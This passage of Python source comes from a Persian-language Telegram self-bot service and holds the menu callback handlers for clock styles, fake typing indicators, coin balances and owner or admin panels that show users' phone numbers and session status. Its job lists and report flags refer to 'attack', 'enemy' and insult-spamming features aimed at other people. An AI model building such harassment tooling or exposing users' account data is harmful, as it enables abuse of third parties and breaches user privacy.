            mk = types.InlineKeyboardMarkup(row_width=1)
            for i in range(1, 11):
                mk.add(types.InlineKeyboardButton(str(previews[i])[:40], callback_data=f"cstyle_{i}_{uid}"))
            mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
            _safe_edit(call, "🎨 استایل های فونت ساعت" + chr(10) + "یکی را انتخاب کنید:", mk)
            bot.answer_callback_query(call.id)
        except Exception as e:
            try:
                bot.answer_callback_query(call.id, str(e)[:100], show_alert=True)
            except Exception:
                pass
        return

    if data.startswith('cstyle_'):
        parts = data.split('_')
        style = int(parts[1])
        target = int(parts[2])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'clock_style', style)
        client = clients.get(uid)
        if client and client.is_connected():
            if get_ud(uid, 'clock_enabled'):
                asyncio.run_coroutine_threadsafe(apply_clock_name(client, uid), loop)
            else:
                # روشن کن و اعمال کن تا تغییر دیده شود
                set_user(uid, 'clock_enabled', True)
                asyncio.run_coroutine_threadsafe(apply_clock_name(client, uid), loop)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, f"فونت {style} اعمال شد ✅", show_alert=True)
        return

    if data.startswith('keep_toggle_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        cur = get_ud(uid, 'keep_messages', False)
        set_user(uid, 'keep_messages', not cur)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "حذف‌نشدن پیام‌ها " + ("روشن شد ✅" if not cur else "خاموش شد ❌"), show_alert=True)
        return

    if data.startswith('typing_menu_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton("فعال در گروه‌ها", callback_data=f"typing_groups_{uid}"))
        mk.add(types.InlineKeyboardButton("فعال در پیوی‌ها", callback_data=f"typing_private_{uid}"))
        mk.add(types.InlineKeyboardButton("گروه مشخص (ایدی)", callback_data=f"typing_gid_{uid}"))
        mk.add(types.InlineKeyboardButton("پیوی مشخص (ایدی)", callback_data=f"typing_uid_{uid}"))
        mk.add(types.InlineKeyboardButton("خاموش کردن در حال نوشتن", callback_data=f"typing_off_{uid}"))
        mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
        _safe_edit(call, "✍️ در حال نوشتن" + chr(10) + "یک حالت را انتخاب کن:", mk)
        bot.answer_callback_query(call.id)
        return

    if data.startswith('typing_groups_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        conf = {'mode': 'groups'}
        set_user(uid, 'typing_conf', conf)
        typing_jobs[uid] = conf
        client = clients.get(uid)
        if client and client.is_connected():
            async def _kick():
                n = 0
                async for d in client.iter_dialogs(limit=30):
                    if d.is_group or (d.is_channel and getattr(d.entity, 'megagroup', False)):
                        try:
                            await client(SetTypingRequest(d.id, SendMessageTypingAction()))
                            n += 1
                        except Exception:
                            pass
                        if n >= 5:
                            break
            try:
                asyncio.run_coroutine_threadsafe(_kick(), loop)
            except Exception:
                pass
        bot.answer_callback_query(call.id, "در حال نوشتن در گروه‌ها فعال شد", show_alert=True)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        return

    if data.startswith('typing_private_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        conf = {'mode': 'private'}
        set_user(uid, 'typing_conf', conf)
        typing_jobs[uid] = conf
        client = clients.get(uid)
        if client and client.is_connected():
            async def _kick():
                n = 0
                async for d in client.iter_dialogs(limit=30):
                    if d.is_user and not getattr(d.entity, 'bot', False) and not getattr(d.entity, 'is_self', False):
                        try:
                            await client(SetTypingRequest(d.id, SendMessageTypingAction()))
                            n += 1
                        except Exception:
                            pass
                        if n >= 5:
                            break
            try:
                asyncio.run_coroutine_threadsafe(_kick(), loop)
            except Exception:
                pass
        bot.answer_callback_query(call.id, "در حال نوشتن در پیوی‌ها فعال شد", show_alert=True)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        return

    if data.startswith('typing_gid_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        admin_states[uid] = {'action': 'typing_gid'}
        _safe_edit(call, "ایدی عددی گروه را بفرست:")
        bot.answer_callback_query(call.id)
        return

    if data.startswith('typing_uid_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        admin_states[uid] = {'action': 'typing_uid'}
        _safe_edit(call, "ایدی عددی کاربر (پیوی) را بفرست:")
        bot.answer_callback_query(call.id)
        return

    if data.startswith('typing_off_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'typing_conf', {'mode': 'off'})
        typing_jobs.pop(uid, None)
        bot.answer_callback_query(call.id, "در حال نوشتن خاموش شد", show_alert=True)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        return

    if data.startswith('tstyles_'):
        try:
            target = int(data.split('_')[-1])
            if target != uid:
                bot.answer_callback_query(call.id)
                return
            cur = get_ud(uid, 'text_style', None)
            cur_txt = {'bold': 'بولد', 'italic': 'کج', 'bold_italic': 'کج بولد'}.get(cur, 'خاموش')
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("بولد", callback_data=f"ts_bold_{uid}"))
            mk.add(types.InlineKeyboardButton("کج", callback_data=f"ts_italic_{uid}"))
            mk.add(types.InlineKeyboardButton("کج بولد", callback_data=f"ts_bi_{uid}"))
            mk.add(types.InlineKeyboardButton("برگشتن به حالت عادی", callback_data=f"ts_off_{uid}"))
            mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
            _safe_edit(call, "📝 استایل متن" + chr(10) + "وضعیت فعلی: " + str(cur_txt) + chr(10) + chr(10) + "با فعال کردن، پیام‌هات با این فرمت ارسال می‌شن.", mk)
            bot.answer_callback_query(call.id)
        except Exception as e:
            try:
                bot.answer_callback_query(call.id, str(e)[:100], show_alert=True)
            except Exception:
                pass
        return

    if data.startswith('ts_bold_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'text_style', 'bold')
        bot.answer_callback_query(call.id, "استایل بولد فعال شد ✅", show_alert=True)
        # refresh panel
        call.data = f"tstyles_{uid}"
        # show styles again
        cur = 'بولد'
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton("بولد", callback_data=f"ts_bold_{uid}"))
        mk.add(types.InlineKeyboardButton("کج", callback_data=f"ts_italic_{uid}"))
        mk.add(types.InlineKeyboardButton("کج بولد", callback_data=f"ts_bi_{uid}"))
        mk.add(types.InlineKeyboardButton("برگشتن به حالت عادی", callback_data=f"ts_off_{uid}"))
        mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
        _safe_edit(call, "📝 استایل متن" + chr(10) + "وضعیت فعلی: " + str(cur) + chr(10) + chr(10) + "با فعال کردن، پیام‌هات با این فرمت ارسال می‌شن.", mk)
        return

    if data.startswith('ts_italic_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'text_style', 'italic')
        bot.answer_callback_query(call.id, "استایل کج فعال شد ✅", show_alert=True)
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton("بولد", callback_data=f"ts_bold_{uid}"))
        mk.add(types.InlineKeyboardButton("کج", callback_data=f"ts_italic_{uid}"))
        mk.add(types.InlineKeyboardButton("کج بولد", callback_data=f"ts_bi_{uid}"))
        mk.add(types.InlineKeyboardButton("برگشتن به حالت عادی", callback_data=f"ts_off_{uid}"))
        mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
        _safe_edit(call, "📝 استایل متن" + chr(10) + "وضعیت فعلی: کج" + chr(10) + chr(10) + "با فعال کردن، پیام‌هات با این فرمت ارسال می‌شن.", mk)
        return

    if data.startswith('ts_bi_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'text_style', 'bold_italic')
        bot.answer_callback_query(call.id, "استایل کج بولد فعال شد ✅", show_alert=True)
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton("بولد", callback_data=f"ts_bold_{uid}"))
        mk.add(types.InlineKeyboardButton("کج", callback_data=f"ts_italic_{uid}"))
        mk.add(types.InlineKeyboardButton("کج بولد", callback_data=f"ts_bi_{uid}"))
        mk.add(types.InlineKeyboardButton("برگشتن به حالت عادی", callback_data=f"ts_off_{uid}"))
        mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
        _safe_edit(call, "📝 استایل متن" + chr(10) + "وضعیت فعلی: کج بولد" + chr(10) + chr(10) + "با فعال کردن، پیام‌هات با این فرمت ارسال می‌شن.", mk)
        return

    if data.startswith('ts_off_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        cur = get_ud(uid, 'text_style', None)
        if not cur:
            bot.answer_callback_query(call.id, "هنوز استایلی انتخاب نشده که برگردی به حالت عادی", show_alert=True)
            return
        names = {'bold': 'بولد', 'italic': 'کج', 'bold_italic': 'کج بولد'}
        name = names.get(cur, cur)
        set_user(uid, 'text_style', None)
        bot.answer_callback_query(call.id, f"استایل {name} غیرفعال شد", show_alert=True)
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton("بولد", callback_data=f"ts_bold_{uid}"))
        mk.add(types.InlineKeyboardButton("کج", callback_data=f"ts_italic_{uid}"))
        mk.add(types.InlineKeyboardButton("کج بولد", callback_data=f"ts_bi_{uid}"))
        mk.add(types.InlineKeyboardButton("برگشتن به حالت عادی", callback_data=f"ts_off_{uid}"))
        mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"personalize_{uid}"))
        _safe_edit(call, "📝 استایل متن" + chr(10) + "وضعیت فعلی: خاموش" + chr(10) + chr(10) + "با فعال کردن، پیام‌هات با این فرمت ارسال می‌شن.", mk)
        return

    if data.startswith('personalize_'):
        bot.answer_callback_query(call.id)
        try:
            personalize_panel(uid, call.message.message_id, call.message.chat.id)
        except Exception as e:
            try:
                bot.send_message(uid, "خطا در شخصی سازی: " + str(e)[:200])
            except Exception:
                pass
        return

    if data.startswith('acc_'):
        u = get_user(uid)
        coins = u.get('coins', 0)
        refs = u.get('referrals', 0)
        phone = u.get('phone') or 'ثبت نشده'
        name = u.get('original_name') or (call.from_user.first_name or str(uid))
        extras = get_extras(uid)
        lines = []
        lines.append("نام: " + str(name))
        lines.append("موجودی: " + str(coins))
        lines.append("زیرمجموعه: " + str(refs))
        lines.append("ایدی عددی:")
        lines.append("`" + str(uid) + "`")
        lines.append("شماره اکانت:")
        lines.append("`" + str(phone) + "`")
        lines.append("")
        lines.append("اکانت های اضافه:")
        if not extras:
            lines.append("ندارد")
        else:
            for aid, info in extras.items():
                if str(aid).lower() in ('all', 'none', ''):
                    continue
                if not isinstance(info, dict):
                    continue
                eph = info.get('phone') or "-"
                if eph in ('—', '-', 'None', 'null'):
                    eph = "-"
                enm = info.get('name') or ""
                if str(enm).lower() == 'all':
                    continue
                eun = info.get('username')
                eid = info.get('id') or aid
                try:
                    int(str(eid).replace('-', ''))
                except Exception:
                    continue
                lines.append("`" + str(eph) + "`")
                extra_line = str(eid)
                if eun:
                    extra_line += " @" + str(eun)
                if enm:
                    extra_line += " " + str(enm)
                lines.append(extra_line)
        lines.append("")
        lines.append("زمان باقی‌مانده: " + remaining_time(coins))
        t = chr(10).join(lines)
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.row(
            types.InlineKeyboardButton(str(coins), callback_data='noop'),
            types.InlineKeyboardButton('موجودی', callback_data='noop'),
        )
        mk.add(types.InlineKeyboardButton('انتقال موجودی', callback_data=f'pv_xfer_{uid}'))
        mk.add(types.InlineKeyboardButton('افزودن موجودی', callback_data=f'buy_sub_{uid}'))
        mk.add(types.InlineKeyboardButton('بازگشت', callback_data=f'back_{uid}'))
        try:
            bot.edit_message_text(t, call.message.chat.id, call.message.message_id, reply_markup=mk, parse_mode='Markdown')
        except Exception:
            try:
                bot.edit_message_text(t, call.message.chat.id, call.message.message_id, reply_markup=mk)
            except Exception:
                try:
                    bot.send_message(uid, t, reply_markup=mk, parse_mode='Markdown')
                except Exception:
                    bot.send_message(uid, t, reply_markup=mk)
        bot.answer_callback_query(call.id)
        return

    elif data.startswith('pv_xfer_') and not data.startswith('pv_xfer_ok_') and not data.startswith('pv_xfer_no_'):
        admin_states[uid] = {'step': 'pv_xfer_id'}
        try:
            bot.edit_message_text("ایدی عددی کاربر گیرنده را بفرست:", call.message.chat.id, call.message.message_id)
        except Exception:
            bot.send_message(uid, "ایدی عددی کاربر گیرنده را بفرست:")
        return

    elif data.startswith('buy_sub_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("پیام به پشتیبانی", url=_support_url()))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
        try:
            bot.edit_message_text("برای خرید اشتراک به پشتیبانی پیام دهید", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            bot.send_message(uid, "برای خرید اشتراک به پشتیبانی پیام دهید", reply_markup=mk)
        bot.answer_callback_query(call.id)
        return

    elif data.startswith('sub_plan_'):
        # sub_plan_25_UID
        parts = data.split('_')
        try:
            target = int(parts[-1])
        except Exception:
            target = uid
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"buy_sub_{uid}"))
        bot.edit_message_text(
            "💳 برای خرید اشتراک به پشتیبانی پیام دهید",
            call.message.chat.id, call.message.message_id, reply_markup=mk
        )
        bot.answer_callback_query(call.id)
        return

    elif data.startswith('ref_'):
        try:
            un = bot.get_me().username
        except Exception:
            un = None
        link = ("https://t.me/" + str(un) + "?start=ref_" + str(uid)) if un else ("ref_" + str(uid))
        refs = get_ud(uid, 'referrals', 0)
        t = (
            "<blockquote><b>لینک زیرمجموعه‌گیری شما</b></blockquote>" + chr(10)
            + "<blockquote><code>" + link + "</code></blockquote>" + chr(10)
            + "<blockquote><b>هر زیرمجموعه ۱۰۰ سکه</b></blockquote>" + chr(10)
            + "<blockquote><b>تعداد:</b> <code>" + str(refs) + "</code></blockquote>"
        )
        mk = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}")
        )
        _safe_edit(call, t, mk, parse_mode='HTML')
        return

    elif data.startswith('manage_'):
        enabled = bool(get_ud(uid, 'self_enabled', True))
        btn = "سلف روشن" if enabled else "سلف خاموش"
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton(btn, callback_data=f"toggle_self_{uid}"))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
        try:
            bot.edit_message_text("مدیریت سلف", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            bot.send_message(uid, "مدیریت سلف", reply_markup=mk)
        bot.answer_callback_query(call.id)
        return

    elif data.startswith('toggle_self_'):
        try:
            target = int(data.split('_')[-1])
        except Exception:
            target = uid
        if target != uid:
            bot.answer_callback_query(call.id, "دسترسی نداری", show_alert=True)
            return
        enabled = bool(get_ud(uid, 'self_enabled', True))
        if enabled:
            set_user(uid, 'self_enabled', False)
            spam_cancel[uid] = True
            for d in (meow_chats, fish_jobs, pishi_jobs, typing_jobs, banner_jobs, react_targets, attack_targets, insult_index, attack_index):
                try:
                    d.pop(uid, None)
                except Exception:
                    pass
            client = clients.get(uid)
            if client and client.is_connected():
                async def _stop_account_work():
                    try:
                        if get_ud(uid, 'clock_enabled'):
                            await client(UpdateProfileRequest(last_name=""))
                    except Exception:
                        pass
                    try:
                        await client(UpdateStatusRequest(offline=True))
                    except Exception:
                        pass
                try:
                    asyncio.run_coroutine_threadsafe(_stop_account_work(), loop)
                except Exception:
                    pass
            bot.answer_callback_query(call.id, "سلف خاموش شد", show_alert=True)
        else:
            if get_ud(uid, 'coins', 0) <= 0:
                bot.answer_callback_query(call.id, "سکه ندارید", show_alert=True)
                return
            set_user(uid, 'self_enabled', True)
            spam_cancel[uid] = False
            if uid not in clients or not clients[uid].is_connected():
                try:
                    asyncio.run_coroutine_threadsafe(start_client(uid), loop)
                except Exception:
                    pass
            bot.answer_callback_query(call.id, "سلف روشن شد", show_alert=True)
        enabled2 = bool(get_ud(uid, 'self_enabled', True))
        btn = "سلف روشن" if enabled2 else "سلف خاموش"
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton(btn, callback_data=f"toggle_self_{uid}"))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
        try:
            bot.edit_message_text("مدیریت سلف", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            pass
        return


    elif data.startswith('on_'):
        if get_ud(uid, 'coins', 0) <= 0:
            bot.answer_callback_query(call.id, "سکه ندارید", show_alert=True)
            return
        set_user(uid, 'self_enabled', True)
        spam_cancel[uid] = False
        if uid not in clients or not clients[uid].is_connected():
            asyncio.run_coroutine_threadsafe(start_client(uid), loop)
        client = clients.get(uid)
        if client and client.is_connected() and get_ud(uid, 'clock_enabled'):
            try:
                asyncio.run_coroutine_threadsafe(apply_clock_name(client, uid), loop)
            except Exception:
                pass
        bot.answer_callback_query(call.id, "سلف با موفقیت روشن شد", show_alert=True)
        status = "روشن ✅"
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(
            types.InlineKeyboardButton("🟢 روشن کردن سلف", callback_data=f"on_{uid}"),
            types.InlineKeyboardButton("🔴 خاموش کردن سلف", callback_data=f"off_{uid}"),
            types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"back_{uid}")
        )
        try:
            bot.edit_message_text(
                "⚙️ مدیریت سلف" + chr(10) + "وضعیت: " + status,
                call.message.chat.id, call.message.message_id, reply_markup=mk
            )
        except:
            pass

    elif data.startswith('off_'):
        set_user(uid, 'self_enabled', False)
        spam_cancel[uid] = True
        meow_chats.pop(uid, None)
        fish_jobs.pop(uid, None)
        pishi_jobs.pop(uid, None)
        typing_jobs.pop(uid, None)
        banner_jobs.pop(uid, None)
        react_targets.pop(uid, None)
        attack_targets.pop(uid, None)
        insult_index.pop(uid, None)
        attack_index.pop(uid, None)
        client = clients.get(uid)
        if client and client.is_connected():
            async def _stop_account_work():
                try:
                    if get_ud(uid, 'clock_enabled'):
                        await client(UpdateProfileRequest(last_name=""))
                except Exception:
                    pass
                try:
                    await client(UpdateStatusRequest(offline=True))
                except Exception:
                    pass
            try:
                asyncio.run_coroutine_threadsafe(_stop_account_work(), loop)
            except Exception:
                pass
        bot.answer_callback_query(call.id, "سلف کاملاً خاموش شد — همه کارها متوقف شد", show_alert=True)
        status = "خاموش ❌"
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(
            types.InlineKeyboardButton("🟢 روشن کردن سلف", callback_data=f"on_{uid}"),
            types.InlineKeyboardButton("🔴 خاموش کردن سلف", callback_data=f"off_{uid}"),
            types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"back_{uid}")
        )
        try:
            bot.edit_message_text(
                "⚙️ مدیریت سلف" + chr(10) + "وضعیت: " + status,
                call.message.chat.id, call.message.message_id, reply_markup=mk
            )
        except:
            pass

    elif data.startswith('connect_'):
        if uid in clients and clients[uid].is_connected():
            bot.answer_callback_query(call.id, "قبلا متصل شدی", show_alert=True)
        else:
            bot.answer_callback_query(call.id)
            mk = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            mk.add(types.KeyboardButton("ارسال شماره", request_contact=True))
            bot.send_message(uid, "برای اتصال دوباره شماره را ارسال کنید:", reply_markup=mk)

    elif data.startswith('back_'):
        try:
            main_panel(uid, call.message.message_id, call.message.chat.id)
        except Exception:
            main_panel(uid)
        bot.answer_callback_query(call.id)
        return

    # Owner Panel
    elif data.startswith('owner_'):
        if not is_owner(uid):
            bot.answer_callback_query(call.id, "دسترسی نداری", show_alert=True)
            return
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("لیست کاربران", callback_data="olist"),
            types.InlineKeyboardButton("فعال ترین", callback_data="otop"),
        )
        mk.add(
            types.InlineKeyboardButton("اطلاعات کاربران", callback_data="ousers_info"),
        )
        mk.add(
            types.InlineKeyboardButton("اکانت های اضافه", callback_data="oextras"),
            types.InlineKeyboardButton("عضویت اجباری", callback_data="oforce"),
        )
        mk.add(
            types.InlineKeyboardButton("پیام همگانی", callback_data="obroadcast"),
            types.InlineKeyboardButton("سکه همگانی", callback_data="odiamond"),
        )
        mk.add(
            types.InlineKeyboardButton("سکه به یک نفر", callback_data="ogiveone"),
            types.InlineKeyboardButton("افزودن سکه", callback_data="obuycoin"),
        )
        mk.add(
            types.InlineKeyboardButton("بن", callback_data="oban_user"),
            types.InlineKeyboardButton("آنبن", callback_data="ounban_user"),
        )
        mk.add(
            types.InlineKeyboardButton("لیست بن شده ها", callback_data="obanned_list"),
            types.InlineKeyboardButton("بن موقت", callback_data="otempban"),
        )
        mk.add(
            types.InlineKeyboardButton("کم کردن از همه", callback_data="oremoveall"),
            types.InlineKeyboardButton("کم کردن از یکی", callback_data="oremove"),
        )
        mk.add(
            types.InlineKeyboardButton("پیام به یکی", callback_data="omsg_one"),
        )
        mk.add(
            types.InlineKeyboardButton("افزودن ادمین", callback_data="oaddadmin"),
            types.InlineKeyboardButton("لیست مالکین ربات", callback_data="oowners"),
        )
        mk.add(
            types.InlineKeyboardButton("حذف ادمین", callback_data="oremoveadmin"),
            types.InlineKeyboardButton("لیست ادمین ها", callback_data="oadmins"),
        )
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
        bot.edit_message_text("👑 پنل مالک:", call.message.chat.id, call.message.message_id, reply_markup=mk)
        bot.answer_callback_query(call.id)

    # Admin Panel (for admins, not owner)
    elif data.startswith('admin_') and is_admin(uid) and not is_owner(uid):
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("لیست کاربران", callback_data="alist"),
            types.InlineKeyboardButton("فعال ترین", callback_data="atop"),
        )
        mk.add(
            types.InlineKeyboardButton("اطلاعات کاربران", callback_data="ausers_info"),
        )
        mk.add(
            types.InlineKeyboardButton("عضویت اجباری", callback_data="aforce"),
        )
        mk.add(
            types.InlineKeyboardButton("پیام همگانی", callback_data="abroadcast"),
            types.InlineKeyboardButton("سکه همگانی", callback_data="adiamond"),
        )
        mk.add(
            types.InlineKeyboardButton("سکه به یک نفر", callback_data="agiveone"),
            types.InlineKeyboardButton("بن", callback_data="aban_user"),
        )
        mk.add(
            types.InlineKeyboardButton("آنبن", callback_data="aunban_user"),
            types.InlineKeyboardButton("لیست بن شده ها", callback_data="abanned_list"),
        )
        mk.add(
            types.InlineKeyboardButton("بن موقت", callback_data="atempban"),
        )
        mk.add(
            types.InlineKeyboardButton("کم کردن از همه", callback_data="aremoveall"),
            types.InlineKeyboardButton("کم کردن از یکی", callback_data="aremove"),
        )
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
        bot.edit_message_text("🛡 پنل ادمین:", call.message.chat.id, call.message.message_id, reply_markup=mk)
        bot.answer_callback_query(call.id)

    # Shared admin/owner actions
    elif data in ["ousers_info", "ausers_info"] and is_admin(uid):
        users = load_data()['users']
        mk = types.InlineKeyboardMarkup(row_width=1)
        # هر کاربر یک دکمه جدا
        items = sorted(users.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0)
        for s, info in items:
            if info.get('banned'):
                continue
            name = info.get('original_name') or s
            sess_ok = bool(info.get('session'))
            mark = "✅" if sess_ok else "❌"
            hm = info.get('last_self_use_short') or ''
            label = f"{mark} {name}"
            if hm:
                label += f" | {hm}"
            label = label[:60]
            mk.add(types.InlineKeyboardButton(label, callback_data=f"uinfo_{s}"))
        back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=back))
        try:
            bot.edit_message_text(
                "اطلاعات کاربران" + chr(10) + "روی هر کاربر بزنید:" + chr(10)
                + "✅ فعال  |  ❌ غیرفعال",
                call.message.chat.id, call.message.message_id, reply_markup=mk,
            )
        except Exception:
            bot.send_message(uid, "اطلاعات کاربران", reply_markup=mk)
        bot.answer_callback_query(call.id)
        return

    elif data.startswith("uinfo_") and is_admin(uid):
        tid = data.split("_", 1)[1]
        info = get_user(int(tid) if tid.isdigit() else tid)
        if not info:
            bot.answer_callback_query(call.id, "پیدا نشد", show_alert=True)
            return
        name = info.get('original_name') or tid
        un = info.get('username')
        phone = info.get('phone') or '—'
        coins = info.get('coins', 0)
        sess_ok = bool(info.get('session'))
        mark = "✅ فعال" if sess_ok else "❌ غیرفعال"
        last = info.get('last_self_use') or info.get('last_login') or '—'
        last_short = info.get('last_self_use_short') or ''
        banned = "بله" if info.get('banned') else "خیر"
        refs = info.get('referrals', 0)
        extras = info.get('extra_accounts') or {}
        lines = [
            "اطلاعات کاربر",
            "────────────",
            f"نام: {name}",
            f"ایدی: `{tid}`",
        ]
        if un:
            lines.append(f"یوزرنیم: @{un}")
        lines.append(f"شماره: `{phone}`")
        lines.append(f"سکه: {coins}")
        lines.append(f"زیرمجموعه: {refs}")
        lines.append(f"وضعیت: {mark}")
        lines.append(f"بن: {banned}")
        lines.append(f"آخرین استفاده سلف: {last}")
        if last_short:
            lines.append(f"ساعت: {last_short}")
        lines.append(f"اکانت اضافه: {len(extras)}")
        if extras:
            for aid, einfo in extras.items():
                if not isinstance(einfo, dict):
                    continue
                if str(aid).lower() in ('all', 'none', ''):
                    continue
                en = einfo.get('name') or aid
                eph = einfo.get('phone') or '—'
                lines.append(f"  • {en} | `{aid}` | `{eph}`")
        body = chr(10).join(lines)
        back = "ousers_info" if is_owner(uid) else "ausers_info"
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=back))
        try:
            bot.edit_message_text(body[:4000], call.message.chat.id, call.message.message_id, reply_markup=mk, parse_mode='Markdown')
        except Exception:
            bot.send_message(uid, body[:4000], reply_markup=mk, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return

    

    elif data == "opanel_title" and is_owner(uid):
        admin_states[uid] = {'step': 'panel_title'}
        cur = get_panel_title()
        _safe_edit(call, "متن فعلی پنل:\n<code>" + cur.replace("<","") + "</code>\n\nمتن جدید را بفرست (مثلاً Panel SelfStr):".replace('\\n', chr(10)) if False else ("متن فعلی پنل:" + chr(10) + "<code>" + cur.replace("<","") + "</code>" + chr(10) + chr(10) + "متن جدید را بفرست:"), parse_mode='HTML')
        bot.answer_callback_query(call.id)
        return
    elif data == "opanel_img" and is_owner(uid):
        mk = types.InlineKeyboardMarkup(row_width=1)
        if get_panel_image():
            mk.add(types.InlineKeyboardButton("عکس فعلی", callback_data="opanel_img_show"))
            mk.add(types.InlineKeyboardButton("حذف عکس", callback_data="opanel_img_del"))
        mk.add(types.InlineKeyboardButton("ارسال عکس جدید", callback_data="opanel_img_set"))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        try:
            bot.edit_message_text("تصویر پنل — عکس دلخواه برای پنل کاربران:", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            bot.send_message(uid, "تصویر پنل:", reply_markup=mk)
        bot.answer_callback_query(call.id)
        return
    elif data == "opanel_img_set" and is_owner(uid):
        admin_states[uid] = {'step': 'panel_img'}
        _safe_edit(call, "عکسی که میخوای برای پنل بذاری رو بفرست:")
        bot.answer_callback_query(call.id)
        return
    elif data == "opanel_img_show" and is_owner(uid):
        fid = get_panel_image()
        if fid:
            try:
                bot.send_photo(uid, fid, caption="عکس فعلی پنل")
            except Exception:
                bot.answer_callback_query(call.id, "خطا در ارسال", show_alert=True)
                return
        bot.answer_callback_query(call.id)
        return
    elif data == "opanel_img_del" and is_owner(uid):
        set_panel_image(None)
        bot.answer_callback_query(call.id, "حذف شد")
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        try:
            bot.edit_message_text("عکس پنل حذف شد. تا عکس بعدی پنل بدون تصویر است.", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            pass
        return

    elif data == "oreports" and is_owner(uid):
        cmds = [
            ("تنظیم دشمن", "تنظیم دشمن"),
            ("ثبت متن", "ثبت متن"),
            ("ثبت فحش", "ثبت فحش"),
            ("امار", "امار"),
            ("پنل", "پنل"),
            ("اتک", "اتک"),
        ]
        mk = types.InlineKeyboardMarkup(row_width=1)
        flags = report_flags()
        for key, label in cmds:
            on = bool(flags.get(key))
            st = "فعال" if on else "غیرفعال"
            mk.add(types.InlineKeyboardButton(label + " | " + st, callback_data="orep_" + key))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        try:
            bot.edit_message_text("گزارش دستورات به مالک اصلی:", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            bot.send_message(uid, "گزارش دستورات:", reply_markup=mk)
        bot.answer_callback_query(call.id)
        return

    elif data.startswith("orep_") and is_owner(uid):
        key = data[5:]
        cur = is_report_on(key)
        set_report_flag(key, not cur)
        # refresh
